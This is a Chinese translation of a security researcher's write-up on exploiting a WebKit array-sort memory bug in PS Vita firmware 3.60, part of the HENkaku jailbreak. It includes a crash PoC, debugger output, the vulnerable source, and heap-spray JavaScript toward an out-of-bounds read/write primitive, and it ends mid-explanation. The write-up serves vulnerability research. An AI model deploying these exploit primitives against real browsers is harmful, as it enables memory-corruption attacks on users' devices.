来源：[Exploiting WebKit on Vita 3.60](https://blog.xyz.is/2016/webkit-360.html)
原作者：[xyzz ](https://github.com/xyzz)
译： **Holic (知道创宇404安全实验室)**
**译者注** ：浏览器作为用户交互较多的应用，漏洞利用点相对多一些，而系统浏览器通常以高权限运行，对封闭的终端设备来说，这就提供了不错的漏洞利用条件。本篇
PSV 的 Writeup 介绍了一个 Webkit 漏洞的利用思路，同理我们可以将思路发散到其他终端设备上，比如之前的 [PS4 1.76版本
Webkit 堆溢出漏洞](https://cturt.github.io/ps4.html)，[Kindle
的越狱](https://github.com/sgayou/kindle-5.6.5-jailbreak/blob/master/doc/README.md)
等...
### 简介
这是 [HENkaku](https://henkaku.xyz/) 攻击链系列 Writeup 的开始章节。我会尽量不对 [KOTH
challenge](https://yifan.lu/2016/08/05/henkaku-koth-challenge)
进行太多破坏，仅仅记录逆向工程的部分，以阐明大家所错过的细节。然而，在这种情况下，挑战无人问津且毫无进展。不管怎样，我将会发布
writeup，既然我已经写了，让它烂在我的repo里面会是一种浪费。
### The PoC
我们选择的能在用户模式执行代码的目标便是 WebKit。Webkit 拥有 JavaScript 引擎，当我们需要绕过 ASLR 时，它对我们很有用。PS
Vita 上的 Web 浏览器也不需要登录 PSN，不会自动更新，允许实现非常简单的攻击利用链（访问网站按下按钮）。完美。
和没有 ASLR 的 3DS 不同，Vita WebKit 有一个可接受的熵值为9 bits 的 ASLR，这就使暴力破解攻击变得非常痛苦（平均需要重新加载
512 次来触发漏洞，好怕！）。因此，我们需要一个比通用 UAF（释放后重用） + vptr（虚函数表指针） 覆写更好的漏洞。
感谢某些人，我设法得到了一个漂亮的 PoC 脚本，可以在最新的固件上造成 Vita 的浏览器崩溃。它不存在于 WebKit bugzilla/repo
的任何地方（或许在限制部分）。
那么作为开始的便是此脚本：
    var almost_oversize = 0x3000;
    var foo = Array.prototype.constructor.apply(null, new Array(almost_oversize));
    var o = {};
    o.toString = function () { foo.push(12345); return ""; }
    foo[0] = 1;
    foo[1] = 0;
    foo[2] = o;
    foo.sort();
如果你在使用 Sony 的 Webkit 的 Linux 主机上运行它，你将看到发生段错误。让我们在调试器里面看看：
    Thread 1 "GtkLauncher" received signal SIGSEGV, Segmentation fault.
    0x00007ffff30bec35 in JSC::WriteBarrierBase::set (this=0x7fff98ef8048, owner=0x7fff9911ff60, value=...) at ../../Source/JavaScriptCore/runtime/WriteBarrier.h:152
    152         m_value = JSValue::encode(value);
    (gdb) bt
    #0  0x00007ffff30bec35 in JSC::WriteBarrierBase::set (this=0x7fff98ef8048, owner=0x7fff9911ff60, value=...) at ../../Source/JavaScriptCore/runtime/WriteBarrier.h:152
    #1  0x00007ffff32cb9bf in JSC::ContiguousTypeAccessor::setWithValue (vm=..., thisValue=0x7fff9911ff60, data=..., i=0, value=...) at ../../Source/JavaScriptCore/runtime/JSArray.cpp:1069
    #2  0x00007ffff32c8809 in JSC::JSArray::sortCompactedVector > (this=0x7fff9911ff60, exec=0x7fff9d6e8078, data=..., relevantLength=3)
        at ../../Source/JavaScriptCore/runtime/JSArray.cpp:1171
    #3  0x00007ffff32c4933 in JSC::JSArray::sort (this=0x7fff9911ff60, exec=0x7fff9d6e8078) at ../../Source/JavaScriptCore/runtime/JSArray.cpp:1214
    #4  0x00007ffff329c844 in JSC::attemptFastSort (exec=0x7fff9d6e8078, thisObj=0x7fff9911ff60, function=..., callData=..., callType=@0x7fffffffbfb4: JSC::CallTypeNone)
        at ../../Source/JavaScriptCore/runtime/ArrayPrototype.cpp:623
    #5  0x00007ffff329db4c in JSC::arrayProtoFuncSort (exec=0x7fff9d6e8078) at ../../Source/JavaScriptCore/runtime/ArrayPrototype.cpp:697
原来她在执行 Javascript Array.sort 函数的时候会遇到未映射的内存。但是这到底发生了什么？
### The bug
让我们看看 `JSArray::sort` 方法（`Source/JavaScriptCore/runtime/JSArray.cpp`)。因为我们的数组是
`ArrayWithContiguous`类型是由它如何创建决定的:`Array.prototype.constructor.apply(null, new
Array(almost_oversize));`，我们进入`sortCompactedVector` 函数。这是它的完整定义：
    template
    void JSArray::sortCompactedVector(ExecState* exec, ContiguousData data, unsigned relevantLength)
    {
        if (!relevantLength)
            return;
        VM& vm = exec->vm();
        // Converting JavaScript values to strings can be expensive, so we do it once up front and sort based on that.
        // This is a considerable improvement over doing it twice per comparison, though it requires a large temporary
        // buffer. Besides, this protects us from crashing if some objects have custom toString methods that return
        // random or otherwise changing results, effectively making compare function inconsistent.
        Vector values(relevantLength);
        if (!values.begin()) {
            throwOutOfMemoryError(exec);
            return;
        }
        Heap::heap(this)->pushTempSortVector(&values);
        bool isSortingPrimitiveValues = true;
        for (size_t i = 0; i ::getAsValue(data, i);
            ASSERT(indexingType != ArrayWithInt32 || value.isInt32());
            ASSERT(!value.isUndefined());
            values[i].first = value;
            if (indexingType != ArrayWithDouble && indexingType != ArrayWithInt32)
                isSortingPrimitiveValues = isSortingPrimitiveValues && value.isPrimitive();
        }
        // FIXME: The following loop continues to call toString on subsequent values even after
        // a toString call raises an exception.
        for (size_t i = 0; i hadException()) {
            Heap::heap(this)->popTempSortVector(&values);
            return;
        }
        // FIXME: Since we sort by string value, a fast algorithm might be to use a radix sort. That would be O(N) rather
        // than O(N log N).
    #if HAVE(MERGESORT)
        if (isSortingPrimitiveValues)
            qsort(values.begin(), values.size(), sizeof(ValueStringPair), compareByStringPairForQSort);
        else
            mergesort(values.begin(), values.size(), sizeof(ValueStringPair), compareByStringPairForQSort);
    #else
        // FIXME: The qsort library function is likely to not be a stable sort.
        // ECMAScript-262 does not specify a stable sort, but in practice, browsers perform a stable sort.
        qsort(values.begin(), values.size(), sizeof(ValueStringPair), compareByStringPairForQSort);
    #endif
        // If the toString function changed the length of the array or vector storage,
        // increase the length to handle the orignal number of actual values.
        switch (indexingType) {
        case ArrayWithInt32:
        case ArrayWithDouble:
        case ArrayWithContiguous:
            ensureLength(vm, relevantLength);
            break;
        case ArrayWithArrayStorage:
            if (arrayStorage()->vectorLength() vm(), relevantLength);
                ContiguousTypeAccessor::replaceDataReference(&data, arrayStorage()->vector());
            }
            if (arrayStorage()->length() setLength(relevantLength);
            break;
        default:
            CRASH();
        }
        for (size_t i = 0; i ::setWithValue(vm, this, data, i, values[i].first);
        Heap::heap(this)->popTempSortVector(&values);
    }
此函数从 JS 数组中取值，将它们放入一个临时向量中，对向量进行排序，然后将值放回 JS 数组。
在第 37 行，`for` 循环中，对于每一个元素，它的`toString`方法被调。当它被我们的对象 `o` 调用时，便是接下来发生的：
    function () {
        foo.push(12345);
        return "";
    }
一个整数被 push 进正在排序的数组。这导致了数组元素被重新分配。在81行，被排序的元素被写回数组，然而，`data`指针
**从不用新分配的值进行更新** 。
图例说明： 
灰色的区域是空闲/未分配的内存。在 Linux 上，实际是在调用 realloc 后取消映射。同时，`data`仍然指向旧的内存区域。因此，Web
浏览器试图向未映射的内存写入，产生段错误。
### Out-of-bounds RW
越界读写
根据内容，`JSArray` 对象可能在内存中以不同的方式存储。然而，我们正在操作的，是作为元数据头( **metadata header**
)（黄色部分）加上数组内容（绿色部分）连续存储的。
内容只是一个`JSValue`结构的向量。
    union EncodedValueDescriptor {
        int64_t asInt64;
        double asDouble;
        struct {
            int32_t payload;
            int32_t tag;
        } asBits;
    };
The metadata header stores two interesting fields:
    uint32_t m_publicLength; // The meaning of this field depends on the array type, but for all JSArrays we rely on this being the publicly visible length (array.length).
    uint32_t m_vectorLength; // The length of the indexed property storage. The actual size of the storage depends on this, and the type.
我们的目标是覆盖它们，并将数组“扩展”超出实际分配的范围。
为了实现这一点，我们来修改`o.toString`方法：
    var normal_length = 0x800;
    var fu = new Array(normal_length);
    var arrays = new Array(0x100);
    o.toString = function () {
        foo.push(12345);
        for (var i = 0; i < arrays.length; ++i) {
            var bar = Array.prototype.constructor.apply(null, fu);
            bar[0] = 0;
            bar[1] = 1;
            bar[2] = 2;
            arrays[i] = bar;
        }
        return "";
    }
如果我们运气好的话，这便是所发生的： 
在此例中（不反映真实数组大小），当使用`data`指针写回排序值的时候，第二条和第三条 `bar`的 metadata headers 将被覆盖。
我们用什么覆盖它们？记住，绿色的区域是 `JSValue` 对象的向量。每一个 `JSValue`对象都是 8 字节的。但是，如果我们使用比如